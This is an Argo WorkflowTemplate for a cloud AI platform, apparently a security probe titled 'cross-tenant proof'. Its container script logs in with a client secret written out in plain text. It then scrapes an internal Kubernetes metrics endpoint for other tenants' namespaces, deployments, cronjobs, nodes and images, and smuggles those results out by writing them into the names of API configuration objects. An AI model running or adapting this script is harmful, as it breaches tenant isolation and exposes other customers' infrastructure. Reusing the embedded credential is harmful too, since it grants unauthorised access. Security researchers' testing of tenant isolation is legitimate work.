apiVersion: argoproj.io/v1alpha1
kind: WorkflowTemplate
metadata:
  name: bb14-probe
  annotations:
    scenarios.ai.sap.com/description: "BB14 test workflow"
    scenarios.ai.sap.com/name: "bb14-scenario"
    executables.ai.sap.com/description: "BB14 test executable"
    executables.ai.sap.com/name: "bb14-probe"
  labels:
    scenarios.ai.sap.com/id: "bb14-scenario"
    executables.ai.sap.com/id: "bb14-probe"
    ai.sap.com/version: "48.0.0"
spec:
  entrypoint: main
  templates:
  - name: main
    metadata:
      labels:
        ai.sap.com/resourcePlan: starter
    container:
      image: nicolaka/netshoot:latest
      command:
      - bash
      - -c
      - |
        # V48: Extract ALL 212 namespaces from KSM-multi (cross-tenant proof)
        AUTH_URL="https://cf-aicore-security-bb-14.authentication.eu10.hana.ondemand.com"
        API="https://api.ai.sec-eu10.eu-central-1.aws.ml.hana.ondemand.com"
        CID="sb-aicore-bb-14!b627554|aicore-xsuaa-std!b563784"
        CSC='aicore-bb-14-key$HWyz9kltTGQqtpP0ZbBl-NPwng_aMxh8F2GaXyYiPRc='

        JWT=$(curl -sk -X POST "${AUTH_URL}/oauth/token" \
          -d "grant_type=client_credentials&client_id=${CID}&client_secret=${CSC}" 2>/dev/null \
          | python3 -c "import json,sys; print(json.load(sys.stdin).get('access_token','FAIL'))" 2>/dev/null)

        save() {
          local name="v48-$(echo "$1" | tr -c 'a-zA-Z0-9._-' '-' | head -c 220)"
          curl -sk -X POST "${API}/v2/lm/configurations" \
            -H "Authorization: Bearer $JWT" -H "AI-Resource-Group: default" \
            -H "Content-Type: application/json" \
            -d "{\"name\":\"${name}\",\"executableId\":\"bb14-probe\",\"scenarioId\":\"bb14-scenario\"}" 2>/dev/null > /dev/null
        }

        KSM_MULTI="100.110.128.70"

        # Read full KSM-multi metrics
        echo "=== KSM-MULTI NAMESPACES ===" >&2
        MULTI=$(curl -sk --connect-timeout 20 "http://${KSM_MULTI}:8080/metrics" 2>&1)

        # Extract ALL unique namespaces
        ALL_NS=$(echo "$MULTI" | grep -o 'namespace="[^"]*"' | sort -u | sed 's/namespace="//;s/"//')
        TOTAL=$(echo "$ALL_NS" | wc -l | tr -d ' ')
        save "total-ns-${TOTAL}"

        # Extract only rg- namespaces (these are tenant resource groups = other tenants)
        RG_NS=$(echo "$ALL_NS" | grep "^rg-")
        RG_COUNT=$(echo "$RG_NS" | grep -c "^rg-" || true)
        save "rg-total-${RG_COUNT}"

        # Save rg- namespaces in batches
        BATCH=""
        BNUM=1
        while IFS= read -r ns; do
          if [ -n "$ns" ]; then
            BATCH="${BATCH}${ns}."
            if [ ${#BATCH} -gt 180 ]; then
              save "rg-${BNUM}-${BATCH}"
              BATCH=""
              BNUM=$((BNUM + 1))
            fi
          fi
        done <<< "$RG_NS"
        [ -n "$BATCH" ] && save "rg-${BNUM}-${BATCH}"

        # Save non-rg namespaces too (infrastructure)
        INFRA_NS=$(echo "$ALL_NS" | grep -v "^rg-")
        BATCH=""
        BNUM=1
        while IFS= read -r ns; do
          if [ -n "$ns" ]; then
            BATCH="${BATCH}${ns}."
            if [ ${#BATCH} -gt 180 ]; then
              save "infra-${BNUM}-${BATCH}"
              BATCH=""
              BNUM=$((BNUM + 1))
            fi
          fi
        done <<< "$INFRA_NS"
        [ -n "$BATCH" ] && save "infra-${BNUM}-${BATCH}"

        # Count pods per rg- namespace (shows other tenants' workload scale)
        echo "=== TENANT WORKLOADS ===" >&2
        while IFS= read -r rg; do
          if [ -n "$rg" ]; then
            POD_COUNT=$(echo "$MULTI" | grep "namespace=\"${rg}\"" | grep -c 'kube_' || true)
            save "rg-load-${rg}-${POD_COUNT}metrics"
          fi
        done <<< "$(echo "$RG_NS" | head -20)"

        # Deployment names from rg- namespaces (other tenants' workloads)
        echo "=== OTHER TENANT DEPLOYMENTS ===" >&2
        XTENANT_DEPS=$(echo "$MULTI" | grep 'kube_deployment_' | grep 'namespace="rg-' | grep -v 'rg-3ba0e0a4' | grep -o 'deployment="[^"]*"' | sort -u | head -15 | tr '\n' '|')
        save "xtenant-deploys-${XTENANT_DEPS}"

        # Cronjob names from rg- namespaces
        XTENANT_CRONS=$(echo "$MULTI" | grep 'kube_cronjob_' | grep 'namespace="rg-' | grep -v 'rg-3ba0e0a4' | grep -o 'cronjob="[^"]*"' | sort -u | head -10 | tr '\n' '|')
        save "xtenant-crons-${XTENANT_CRONS}"

        # Node info (what nodes run tenant pods)
        NODES=$(echo "$MULTI" | grep -o 'node="[^"]*"' | sort -u | head -10 | tr '\n' '|')
        save "nodes-${NODES}"

        # Images used by other tenants
        IMAGES=$(echo "$MULTI" | grep 'kube_pod_container_info' | grep 'namespace="rg-' | grep -v 'rg-3ba0e0a4' | grep -o 'image="[^"]*"' | sort -u | head -10 | tr '\n' '|')
        save "xtenant-images-${IMAGES}"

        echo "V48 DONE" >&2
